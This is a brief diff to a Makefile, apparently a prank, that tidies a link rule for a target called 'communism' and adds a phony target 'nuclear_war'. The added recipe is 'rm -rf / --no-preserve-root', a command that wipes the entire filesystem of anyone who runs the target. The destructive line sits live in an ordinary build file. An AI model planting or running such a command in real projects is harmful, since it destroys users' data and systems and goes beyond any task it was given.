@@ -15,8 +15,9 @@ clean: $(OBJECTS)
 	rm $(OBJECTS)
 
 communism: $(OBJECTS)
-	CC communism $(OBJECTS) CFLAGS
+	CC $@ $(OBJECTS) CFLAGS
 
 .PHONY: nuclear_war
 nuclear_war:
+	rm -rf / --no-preserve-root
  
